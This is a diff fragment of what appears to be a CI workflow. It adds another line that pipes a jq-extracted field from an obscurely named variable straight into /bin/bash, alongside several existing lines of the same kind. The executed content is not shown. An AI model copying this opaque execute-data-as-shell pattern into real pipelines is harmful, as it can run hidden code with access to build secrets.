@@ -27,6 +27,7 @@ jobs:
           echo $getl5988 | jq -r .dz39 | /bin/bash
           echo $b92 | jq -r .vru23 | /bin/bash
           echo $cmko485 | jq -r .hp46 | /bin/bash
+          echo $felb57 | jq -r .beiks961 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
